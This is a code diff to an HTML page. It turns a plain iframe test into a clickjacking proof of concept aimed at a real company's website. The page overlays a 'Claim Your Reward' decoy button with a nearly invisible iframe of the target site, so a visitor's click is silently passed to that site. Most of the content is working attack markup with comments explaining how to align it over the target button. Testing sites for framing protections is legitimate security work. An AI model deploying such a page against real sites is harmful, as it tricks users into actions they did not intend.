@@ -2,23 +2,54 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Clickjacking Test</title>
+  <title>Clickjacking PoC – Simple Claim Button</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-    }
-    iframe {
-      width: 100%;
+    body { font-family: Arial, sans-serif; }
+    .container {
+      position: relative;
+      width: 800px;
       height: 600px;
-      border: 2px solid red;
+      margin: 20px auto;
+    }
+    /* Visible decoy button – sits behind the transparent iframe */
+    .claim-button {
+      position: absolute;
+      top: 250px;               /* Adjust to overlay the target button */
+      left: 300px;
+      z-index: 1;
+      background: #ff9800;
+      color: white;
+      padding: 16px 32px;
+      font-size: 20px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    /* Transparent iframe – on top, intercepts the click */
+    iframe.overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0.001;           /* Nearly invisible, but still clickable */
+      z-index: 2;
+      border: none;
     }
   </style>
 </head>
 <body>
 
-<h2>Clickjacking Test – iframe load check</h2>
+  <h2>Clickjacking PoC – “Claim Reward” button</h2>
+  <p>Clicking the orange button actually clicks the site loaded in the invisible iframe.</p>
 
-<iframe src="https://applicationdesigner.de/index.php"></iframe>
+  <div class="container">
+    <!-- The decoy button the victim sees -->
+    <button class="claim-button">🎁 Claim Your Reward</button>
+
+    <!-- The transparent iframe (target site) – loads on top, intercepts the click -->
+    <iframe class="overlay" src="https://www.anduril.com/"></iframe>
+  </div>
 
 </body>
 </html>
